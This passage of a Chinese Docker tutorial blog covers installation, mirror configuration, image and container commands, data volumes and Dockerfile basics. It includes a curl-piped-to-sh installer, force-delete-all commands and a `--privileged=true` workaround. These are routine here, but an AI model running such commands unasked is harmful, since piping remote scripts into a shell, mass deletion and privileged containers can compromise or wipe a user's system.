title="3.Docker三要素"></a>3.Docker三要素</h3><p>docker三要素：镜像、仓库、容器</p><p>镜像就是模板，容器就是镜像的一个实例，docker利用容器独立运行一个或一组应用，可以把容器看作是一个简易版的Linux环境和运行在其中的应用程序，仓库是集中存放镜像的地方。</p><h3 id="4-Docker的安装"><a href="#4-Docker的安装" class="headerlink" title="4.Docker的安装"></a>4.Docker的安装</h3><h4 id="1-centOS安装docker"><a href="#1-centOS安装docker" class="headerlink" title="(1) centOS安装docker"></a>(1) centOS安装docker</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> -y epel-release<br>yum <span class="hljs-keyword">install</span> -y docker-io<br><span class="hljs-comment"># 安装后的配置文件：/etc/sysconfig/docker</span><br>service docker start <span class="hljs-comment"># 启动docker后台服务</span><br>docker version <span class="hljs-comment"># 查看版本，验证是否安装成功</span><br></code></pre></td></tr></table></figure><h4 id="2-ubuntu安装docker"><a href="#2-ubuntu安装docker" class="headerlink" title="(2) ubuntu安装docker"></a>(2) ubuntu安装docker</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -sSL https:<span class="hljs-regexp">//g</span>et.daocloud.io/docker | sh<br></code></pre></td></tr></table></figure><p>安装教程可查看：<a href="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a></p><h4 id="3-配置阿里云镜像加速器："><a href="#3-配置阿里云镜像加速器：" class="headerlink" title="(3) 配置阿里云镜像加速器："></a>(3) 配置阿里云镜像加速器：</h4><p>首先在阿里云平台注册账户，登录后找到“镜像加速器”选项，在相应的操作系统下的命令复制，命令大约长下面这样。注意，其中<strong>https</strong>那段我没有给出完整的链接。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo mkdir -p <span class="hljs-regexp">/etc/</span>docker<br><br>sudo tee <span class="hljs-regexp">/etc/</span>docker/daemon.json &lt;&lt;-<span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://*.mirror.aliyuncs.com&quot;</span>]<br>&#125;<br>EOF<br><br>sudo systemctl daemon-reload<br><br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure><p><code>ps -ef|grep docker</code>：查看是否是阿里云加速器</p><p>解决docker权限问题：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">sudo gpasswd -a username docker <span class="hljs-meta">#将普通用户username加入到docker组</span><br><span class="hljs-keyword">new</span><span class="hljs-type">grp</span> docker <span class="hljs-meta">#更新docker组</span><br></code></pre></td></tr></table></figure><h3 id="4-测试"><a href="#4-测试" class="headerlink" title="(4) 测试"></a>(4) 测试</h3><ul><li><code>docker run hello-world</code>：运行hello world</li></ul><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808202511890.png" class title="image-20230808202511890"><p>运行镜像的流程:</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808202526443.png" class title="image-20230808202526443"><h2 id="二、Docker常用命令"><a href="#二、Docker常用命令" class="headerlink" title="二、Docker常用命令"></a>二、Docker常用命令</h2><h3 id="1-docker帮助命令"><a href="#1-docker帮助命令" class="headerlink" title="1.docker帮助命令"></a>1.docker帮助命令</h3><h4 id="1-查看docker版本"><a href="#1-查看docker版本" class="headerlink" title="(1) 查看docker版本"></a>(1) 查看docker版本</h4><p>docker version：查看版本信息</p><h4 id="2-查看docker信息"><a href="#2-查看docker信息" class="headerlink" title="(2) 查看docker信息"></a>(2) 查看docker信息</h4><p>docker info：查看docker信息</p><h4 id="3-docker帮助命令"><a href="#3-docker帮助命令" class="headerlink" title="(3) docker帮助命令"></a>(3) docker帮助命令</h4><p>docker –help：帮助命令</p><h4 id="2-docker镜像命令"><a href="#2-docker镜像命令" class="headerlink" title="2.docker镜像命令"></a>2.docker镜像命令</h4><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808202605168.png" class title="image-20230808202605168"><h4 id="1-列出所有镜像"><a href="#1-列出所有镜像" class="headerlink" title="(1) 列出所有镜像"></a>(1) 列出所有镜像</h4><p>docker images：列出本地主机上的镜像，镜像由镜像名:tag唯一标记，tag可认为是版本号<br>docker images -a：列出本地所有的镜像（含中间映像层）<br>docker images -q：只显示镜像的id<br>docker images –digests：显示镜像的摘要信息<br>docker images –no-trunc：显示完整的镜像信息</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808202621006.png" class title="image-20230808202621006"><p>选项说明：</p><p>REPOSITORY：表示镜像的仓库源<br>TAG：镜像的标签<br>IMAGE ID：镜像ID<br>CREATED：镜像创建时间<br>SIZE：镜像大小</p><h4 id="2-在github搜索镜像"><a href="#2-在github搜索镜像" class="headerlink" title="(2) 在github搜索镜像"></a>(2) 在github搜索镜像</h4><p>docker search 镜像名：在github上搜索某个镜像<br>docker search -s 30 tomcat：列出starts数不小于30的镜像<br>docker search –no-trunc 镜像名：显示完整的镜像描述<br>docker –automated 镜像名：只列出automated build类型的镜像</p><h4 id="3-下载镜像"><a href="#3-下载镜像" class="headerlink" title="(3) 下载镜像"></a>(3) 下载镜像</h4><p>docker pull 镜像名：下载镜像<br>docker pull 镜像名:TAG：下载指定TAG的镜像，不加TAG默认为latest</p><h4 id="4-删除未在使用的镜像"><a href="#4-删除未在使用的镜像" class="headerlink" title="(4) 删除未在使用的镜像"></a>(4) 删除未在使用的镜像</h4><p>docker rmi 镜像名：删除未在使用镜像，若在使用则不能删除，默认删除latest的<br>docker rmi -f 镜像名：强制删除<br>docker rmi -f 镜像名1:TAG 镜像名2:TAG：删除多个<br>docker rmi -f $(docker images -qa)：删除全部</p><h3 id="3-docker容器命令"><a href="#3-docker容器命令" class="headerlink" title="3.docker容器命令"></a>3.docker容器命令</h3><p>以CentOS镜像为例演示，先用docker pull centos命令下载相应镜像</p><h4 id="1-新建并启动容器"><a href="#1-新建并启动容器" class="headerlink" title="(1) 新建并启动容器"></a>(1) 新建并启动容器</h4><p>docker run [options] 镜像名 [command] [arg…]：新建并启动容器</p><p>docker run –name&#x3D;容器新名字：为容器指定一个名称</p><p>docker run -i 镜像名：以交互模式运行容器，通常与-t同时使用<br>docker run -t 镜像名：为容器重新分配一个伪输入终端，通常与-i同时使用</p><p>docker run -d 镜像名：后台运行容器，并返回容器id，即启动守护式容器<br>docker run -P 镜像名： 随机端口映射<br>docker run -p 镜像名： 指定端口映射，有以下四种格式:</p><p>​    ip:hostPort:containerPort<br>​    ip::containerPort<br>​    hostPort:containerPort<br>​    containerPort</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808202744481.png" class title="image-20230808202744481"><h4 id="2-列出正在运行的容器"><a href="#2-列出正在运行的容器" class="headerlink" title="(2) 列出正在运行的容器"></a>(2) 列出正在运行的容器</h4><p>docker ps：列出当前所有正在运行的容器</p><h4 id="3-列出历史上运行过的容器"><a href="#3-列出历史上运行过的容器" class="headerlink" title="(3) 列出历史上运行过的容器"></a>(3) 列出历史上运行过的容器</h4><p>docker ps -a：列出当前所有正在运行的容器+历史上运行过的容器<br>docker ps -l：显示最近创建的容器<br>docker ps -n 数字：显示最近创建的n个容器<br>docker ps -q：静默模式，只显示容器编号<br>docker ps –no-trunc：不截断输出</p><h4 id="4-退出容器"><a href="#4-退出容器" class="headerlink" title="(4) 退出容器"></a>(4) 退出容器</h4><p>exit：容器停止退出<br>Ctrl+P+Q：容器不停止退出</p><h4 id="5-启动-x2F-重启-x2F-停止容器"><a href="#5-启动-x2F-重启-x2F-停止容器" class="headerlink" title="(5) 启动&#x2F;重启&#x2F;停止容器"></a>(5) 启动&#x2F;重启&#x2F;停止容器</h4><p>docker start 容器名：启动容器</p><p>docker restart 容器名：重启容器</p><p>docker stop 容器名：停止容器，类似于电脑关机</p><p>docker kill 容器名：强制停止，类似于电脑拔电源关机</p><h4 id="6-删除容器"><a href="#6-删除容器" class="headerlink" title="(6) 删除容器"></a>(6) 删除容器</h4><p>docker rm 容器名：删除已停止的容器，若未停止则不删除<br>docker rm -f 容器名：停止并删除容器<br>docker rm -f $(docker ps -aq)：删除所有容器</p><h4 id="7-后台运行容器"><a href="#7-后台运行容器" class="headerlink" title="(7) 后台运行容器"></a>(7) 后台运行容器</h4><p>docker run -d 容器名：启动守护式容器，运行在后台，用docker ps查看看不到，因为已经退出了。docker容器后台运行，必须有一个前台进程</p><h4 id="8-容器日志相关"><a href="#8-容器日志相关" class="headerlink" title="(8) 容器日志相关"></a>(8) 容器日志相关</h4><p>docker logs [options] 容器名：查看容器日志</p><p>docker logs -t 容器名：加入时间戳</p><p>docker logs -f 容器名：跟随最新的日志打印（动态打印）<br>docker logs –tail 数字 容器名：显示最后多少条</p><h4 id="9-查看容器内的进程"><a href="#9-查看容器内的进程" class="headerlink" title="(9) 查看容器内的进程"></a>(9) 查看容器内的进程</h4><p>docker top 容器名：查看容器内的进程</p><h4 id="10-查看容器内部细节"><a href="#10-查看容器内部细节" class="headerlink" title="(10) 查看容器内部细节"></a>(10) 查看容器内部细节</h4><p>docker inspect 容器名：查看容器内部细节，返回是json串</p><h4 id="11-进入正在运行的容器并以命令行交互"><a href="#11-进入正在运行的容器并以命令行交互" class="headerlink" title="(11) 进入正在运行的容器并以命令行交互"></a>(11) 进入正在运行的容器并以命令行交互</h4><p>docker exec -it 容器名 bash命令：在容器中打开新的终端，并可以启动新的进程<br>docker exec -it 容器名 ls -l &#x2F;tmp：不进入容器，直接拿到ls -l &#x2F;tmp命令的执行结果，等价于使用docker exec -it 容器名 &#x2F;bin&#x2F;bash先进入bash，再执行ls -l &#x2F;tmp得到结果<br>docker attach 容器名：直接进入容器启动命令的终端，不会启动新的进程</p><h4 id="12-拷贝容器内容到本机"><a href="#12-拷贝容器内容到本机" class="headerlink" title="(12) 拷贝容器内容到本机"></a>(12) 拷贝容器内容到本机</h4><p>docker cp 容器名:容器中文件的路径 本机路径：从容器内拷贝文件到本机上</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808202905930.png" class title="image-20230808202905930"><h2 id="三、Docker镜像"><a href="#三、Docker镜像" class="headerlink" title="三、Docker镜像"></a>三、Docker镜像</h2><h3 id="1-联合文件系统（UnionFS）"><a href="#1-联合文件系统（UnionFS）" class="headerlink" title="1.联合文件系统（UnionFS）"></a>1.联合文件系统（UnionFS）</h3><p>UnionFS是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下，UnionFS是docker镜像的基础，镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</p><p>特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统该，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。</p><h3 id="2-docker镜像加载原理"><a href="#2-docker镜像加载原理" class="headerlink" title="2.docker镜像加载原理"></a>2.docker镜像加载原理</h3><p>docker的镜像实际上是由一层层的文件系统组成，这种层级的文件系统就是UnionFS</p><p>bootfs（boot文件系统）主要包含bootloader和kernel，bootloader主要是引导加载kernel，Linux刚启动的时候会加载bootfs文件系统，在docker镜像的最底层是bootfs。这一层与Linux系统该是一样的，包含boot加载器和内核。当boot加载完成后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs。</p><p>rootfs（root文件系统），在bootfs之上，包含的是典型Linux系统中的&#x2F;dev，&#x2F;proc，&#x2F;bin，&#x2F;etc等标准目录和文件。rootfs就是各种不同的操作系统该发行版，如Ubuntu、CentOS等。</p><p>对于一个精简的OS，rootfs可以很小，只需要包括最基本的命令、工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供rootfs就行了。所以对于不同的Linux发行版，bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以共用bootfs。</p><h3 id="3-镜像的特点和优点"><a href="#3-镜像的特点和优点" class="headerlink" title="3.镜像的特点和优点"></a>3.镜像的特点和优点</h3><h4 id="1-镜像的特点"><a href="#1-镜像的特点" class="headerlink" title="(1) 镜像的特点"></a>(1) 镜像的特点</h4><p>docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部，这一层通常被称作“容器层”，“容器层”之下的为“镜像层”。</p><h4 id="2-分层镜像的优点"><a href="#2-分层镜像的优点" class="headerlink" title="(2) 分层镜像的优点"></a>(2) 分层镜像的优点</h4><p>使用分层镜像的优点是可以共享资源，比如有多个镜像都从相同的base镜像构建而来，那么宿主机上只需要保存一份base镜像，内存中也只需要加载一份base镜像，就可以为所有容器服务了。镜像的每一层都可以被共享。 以pull为例，在下载的过程中可以看到docker的镜像好像是在一层一层的在下载。</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203104072.png" class title="image-20230808203104072"><h3 id="4-镜像提交"><a href="#4-镜像提交" class="headerlink" title="4.镜像提交"></a>4.镜像提交</h3><h4 id="1-commit命令"><a href="#1-commit命令" class="headerlink" title="(1) commit命令"></a>(1) commit命令</h4><p>docker commit -m&#x3D;”提交的描述信息” -a&#x3D;”作者” 容器名 要创建的目标镜像名:[TAG]：提交容器副本使之成为一个新的镜像</p><h4 id="2-镜像提交实例"><a href="#2-镜像提交实例" class="headerlink" title="(2) 镜像提交实例"></a>(2) 镜像提交实例</h4><p>docker run -it -p 8080:8080 tomcat：从hub上下载tomcat镜像到本地并运行</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203122560.png" class title="image-20230808203122560"><p>故意删除上一步镜像生产tomcat容器的文档</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203132250.png" class title="image-20230808203132250"><p><code>docker commit -a=&quot;zuzhiang&quot; -m=&quot;del tomcat docs&quot; 容器名 atguigu/tomcat/02:1.2</code>：以它为模板提交一个没有文档的tomcat新镜像<code>atguigu/tomcat02</code></p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203209185.png" class title="image-20230808203209185"><p><code>docker run -it -p 7777:8080 atguigu/tomcat02:1.2</code>：启动新镜像并访问<code>localhost:7777/docs</code>界面，可以发现与原镜像相比无文档</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203306424.png" class title="image-20230808203306424"><h2 id="四、容器数据卷"><a href="#四、容器数据卷" class="headerlink" title="四、容器数据卷"></a>四、容器数据卷</h2><h3 id="1-容器数据卷"><a href="#1-容器数据卷" class="headerlink" title="1.容器数据卷"></a>1.容器数据卷</h3><h4 id="1-是什么"><a href="#1-是什么" class="headerlink" title="(1) 是什么"></a>(1) 是什么</h4><p>容器删除后数据自然也就没有了，所以用卷来保存数据。容器数据卷功能是持久化和数据共享。 卷就是目录或文件，存在于一个或多个容器中，由docker挂载到容器，但不属于联合文件系统，因此能够绕过Union File Syste提供一些用于持续存储或共享数据的特性。</p><h4 id="2-容器数据卷的特点"><a href="#2-容器数据卷的特点" class="headerlink" title="(2) 容器数据卷的特点"></a>(2) 容器数据卷的特点</h4><p>数据卷可以在容器之间共享或重用数据<br>卷中的更改可以直接生效<br>数据卷中的更改不会包含在镜像的更新中<br>数据卷的生命周期一直持续到没有容器使用它为止</p><h3 id="2-容器内添加数据卷"><a href="#2-容器内添加数据卷" class="headerlink" title="2.容器内添加数据卷"></a>2.容器内添加数据卷</h3><h4 id="1-直接命令添加"><a href="#1-直接命令添加" class="headerlink" title="(1) 直接命令添加"></a>(1) 直接命令添加</h4><p>docker run -it -v &#x2F;宿主机绝对路径:&#x2F;容器内目录[:ro] 镜像名 .：将宿主机的目录和容器内目录绑定，之后对宿主机或容器内相应文件夹的内容添加和修改就是同步的了。容器每次启动后会将数据同步。添加:ro时表示是只读模式，宿主机可以添加和修改文件，但是容器内不可以。</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203341329.png" class title="image-20230808203341329"><p><code>docker inspect 容器名</code>：查看数据卷是否挂载成功，其中Volumes里面有绑定的目录</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203359409.png" class title="image-20230808203359409"><p>容器和宿主机之间数据共享</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203412381.png" class title="image-20230808203412381"><p>容器停止后，宿主机修改数据是否同步</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203421712.png" class title="image-20230808203421712"><p>如果无权限，则使用<code>docker run -it -v /宿主机绝对路径:/容器内目录 --privileged=true 镜像名 .</code>即可</p><h4 id="2-dockerFile添加"><a href="#2-dockerFile添加" class="headerlink" title="(2) dockerFile添加"></a>(2) dockerFile添加</h4><p>dockerFile是镜像的描述文件</p><p>根目录下新建<code>mydocker</code>文件夹并进入</p><p><code>VOLUME[&quot;/dataVolumeContainer&quot;,&quot;/dataVolumeContainer2&quot;,&quot;/dataVolumeContainer3&quot;]</code>：可在<code>dockerFile</code>中能使用volume指令来给镜像添加一个或多个数据卷</p><p><code>vi dockerfile</code>：File构建</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">VOLUME</span><span class="language-bash"> [<span class="hljs-string">&quot;/dataVolumeContainer1&quot;</span>,<span class="hljs-string">&quot;/dataVolumeContainer2&quot;</span>]</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;finished,--------success1&quot;</span></span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> /bin/bash</span><br></code></pre></td></tr></table></figure><p><code>docker build -f /mydocker/dockerfile -t zza/centos</code>：build后生成镜像，获得一个新镜像<code>zza/centos</code></p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203552563.png" class title="image-20230808203552563"><p><code>docker run -it zza/centos</code>：运行容器，容器内自带两个容器数据卷，对应的宿主机的目录默认，可以通过<code>docker inspect</code>查看</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203604410.png" class title="image-20230808203604410"><h2 id="3-数据卷容器"><a href="#3-数据卷容器" class="headerlink" title="3. 数据卷容器"></a>3. 数据卷容器</h2><h3 id="1-是什么-1"><a href="#1-是什么-1" class="headerlink" title="(1) 是什么"></a>(1) 是什么</h3><p>命名的容器挂载数据卷，其它容器通过挂载这个(父容器)实现数据共享，挂载数据卷的容器，称之为数据卷容器。</p><h3 id="2-容器间传递共享"><a href="#2-容器间传递共享" class="headerlink" title="(2) 容器间传递共享"></a>(2) 容器间传递共享</h3><ul><li>先启动一个父容器：<code>docker run -it --name dc01 zza/centos</code></li></ul><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203614985.png" class title="image-20230808203614985"><p>dc02继承自dc01：<code>docker run -it --name dc02 --volumes-from dc01 zza/centos</code></p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203628328.png" class title="image-20230808203628328"><p>回到dc01可以看到02&#x2F;03各自添加的都能共享了</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203701790.png" class title="image-20230808203701790"><p>删除dc01，dc02修改后dc03可否访问</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203709595.png" class title="image-20230808203709595"><p>删除dc02后dc03可否访问</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203724350.png" class title="image-20230808203724350"><p>新建dc04继承dc03后再删除dc03</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203736176.png" class title="image-20230808203736176"><p>结论：</p><p>父子容器之间数据共享，删除父容器后，修改某一子容器会响应其兄弟元素<br>容器之间配置信息的传递，数据卷生命周期一直持续到没有容器使用它为止</p><h2 id="五、DockerFile解析"><a href="#五、DockerFile解析" class="headerlink" title="五、DockerFile解析"></a>五、DockerFile解析</h2><h3 id="1-DockerFile"><a href="#1-DockerFile" class="headerlink" title="1.DockerFile"></a>1.DockerFile</h3><h4 id="1-是什么-2"><a href="#1-是什么-2" class="headerlink" title="(1) 是什么"></a>(1) 是什么</h4><p>dockerFile是用来构建docker镜像的构建文件，是由一系列命令和参数构成的脚本。 Dockerfile定义了进程需要的一切东西。Dockerfile涉及的内容包括执行代码或者是文件、环境变量、依赖包、运行时环境、动态链接库、操作系统的发行版、服务进程和内核进程(当应用进程需要和系统服务和内核进程打交道，这时需要考虑如何设计namespace的权限控制)等等</p><h4 id="2-构建三步骤"><a href="#2-构建三步骤" class="headerlink" title="(2) 构建三步骤"></a>(2) 构建三步骤</h4><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203808217.png" class title="image-20230808203808217"><p>编写DockerFile文件</p><p>docker build</p><p>docker run</p><h4 id="3-DockerFile内容基础知识"><a href="#3-DockerFile内容基础知识" class="headerlink" title="(3) DockerFile内容基础知识"></a>(3) DockerFile内容基础知识</h4><p>每条保留字指令都必须为大写字母且后面要跟随至少一个参数<br>指令从上到下顺序执行<br>#表示注释<br>每条指令都会创建一个新的镜像层，并对镜像进行提交</p><h4 id="4-docker运行dockerFile的大致流程："><a href="#4-docker运行dockerFile的大致流程：" class="headerlink" title="(4) docker运行dockerFile的大致流程："></a>(4) docker运行dockerFile的大致流程：</h4><p>docker从基础镜像运行一个容器<br>执行一条指令并对容器做出修改<br>执行类似docker commit的操作提交一个新的镜像层<br>docker再基于刚提交的镜像运行一个新容器<br>执行dockerFile中的下一条指令知道所有指令都执行完成</p><h3 id="2-保留字指令"><a href="#2-保留字指令" class="headerlink" title="2.保留字指令"></a>2.保留字指令</h3><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203834643.png" class title="image-20230808203834643"><p>FROM：基础镜像，当前镜像是基于哪个镜像的</p><p>MAINTAINER：镜像维护者的姓名和邮箱地址</p><p>RUN：容器构建时需要运行的命令</p><p>EXPOSE：当前容器对外暴露出的端口</p><p>WORKDIR：指定在创建容器后，终端默认登录进来的工作目录</p><p>ENV：用来在构建镜像过程中设置环境变量</p><p>ADD：将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包</p><p>COPY：类似ADD，拷贝文件和目录到镜像中。将从构建上下文目录中&lt;源文件&gt;的文件&#x2F;目录复制到镜像内的&lt;目标路径&gt;位置</p><p>VOLUME：容器数据卷，用于数据保存和持久化工作</p><p>CMD：指定一个容器启动时要运行的命令，DockerFile中可以有多个CMD命令，但只有最后一个生效，CMD会被docker run之后的参数替换</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203910433.png" class title="image-20230808203910433"><p>ENTRYPOINT：指定一个容器启动时要运行的命令，ENTRYPOINT的目的和CMD一样，都是指定容器启动程序及参数</p><p>ONBUILD：当构建一个被继承的DockerFile时运行命令，父镜像在被子镜像继承后父镜像的onbuild被触发3. 案例</p><h4 id="1-自定义镜像mycentos"><a href="#1-自定义镜像mycentos" class="headerlink" title="(1) 自定义镜像mycentos"></a>(1) 自定义镜像mycentos</h4><h5 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h5><p>默认CentOS镜像的情况</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808203945518.png" class title="image-20230808203945518"><p>编写DokerFile文件</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">MAINTAINER</span> zuzhiang&lt;zuzhiang@<span class="hljs-number">126</span>.com&gt;<br><br><span class="hljs-keyword">ENV</span> MYPATH /tmp<br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> <span class="hljs-variable">$MYPATH</span></span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> yum -y install vim</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> yum -y install net-tools</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$MYPATH</span></span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;success    ok&quot;</span></span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> /bin/bash</span><br></code></pre></td></tr></table></figure><h5 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h5><p><code>docker build -t mycentos:1.3</code></p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204014383.png" class title="image-20230808204014383"><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204022446.png" class title="image-20230808204022446"><h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p><code>docker run -it mycentos:1.3</code></p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204056075.png" class title="image-20230808204056075"><p>镜像变更历史<br><code>docker history</code> 镜像名：列出镜像变更历史</p><h5 id="2-CMD-x2F-ENTRYPOINT镜像案例"><a href="#2-CMD-x2F-ENTRYPOINT镜像案例" class="headerlink" title="(2) CMD&#x2F;ENTRYPOINT镜像案例"></a>(2) CMD&#x2F;ENTRYPOINT镜像案例</h5><p><strong>相同点</strong><br>都是指定一个容器启动时要运行的命令</p><p><strong>CMD</strong><br>DockerFile中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换。在tomcat容器dockerFile的最后一行是<code>CMD [&quot;catalina.sh&quot;,&quot;run&quot;]</code>，但如果<code>docker run -it tomcat ls -l</code>时，则命令行参数会把最后一行CMD命令给替换，导致tomcat不能正常启动</p><p><strong>CMD版查询IP信息的容器</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">RUN</span><span class="language-bash"> yum install -y curl</span><br><span class="hljs-comment"># curl命令可以用来执行下载、发送各种HTTP请求，指定HTTP头部等操作</span><br><span class="hljs-comment"># 执行后，www.baidu.com的html就会显示在屏幕上了</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;curl&quot;</span>,<span class="hljs-string">&quot;-s&quot;</span>,<span class="hljs-string">&quot;http://ip.cn&quot;</span>]</span><br></code></pre></td></tr></table></figure><p><code>docker build -f dockerfile4 -t myip</code>：构建</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204158355.png" class title="image-20230808204158355"><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204205592.png" class title="image-20230808204205592"><p><strong>ENTRYPOINT</strong></p><p><code>docker run</code>之后的参数会被当作参数传递给ENTRYPOINT，之后形成新的命令组合</p><p><strong>ENTRYPOINT版查询IP信息的容器</strong>*</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">RUN</span><span class="language-bash"> yum install -y curl</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;curl&quot;</span>,<span class="hljs-string">&quot;-s&quot;</span>,<span class="hljs-string">&quot;http://ip.cn&quot;</span>]</span><br><span class="hljs-comment"># 被继承时，直接在子dockerFile中&quot;FROM 容器名&quot;进行继承</span><br><span class="hljs-keyword">ONBUILD</span> <span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;father images onbuild.&quot;</span></span><br></code></pre></td></tr></table></figure><p>先build自己镜像myip，然后运行<code>docker run -it myip -i</code>，变成了执行<code>curl -s -i http://ip.cn</code>命令</p><img src="/2023/08/06/%E5%B0%9A%E7%A1%85%E8%B0%B7Docker/image-20230808204251531.png" class title="image-20230808204251531"><h4 id="3-自定义镜像Tomcat9"><a href="#3-自定义镜像Tomcat9" 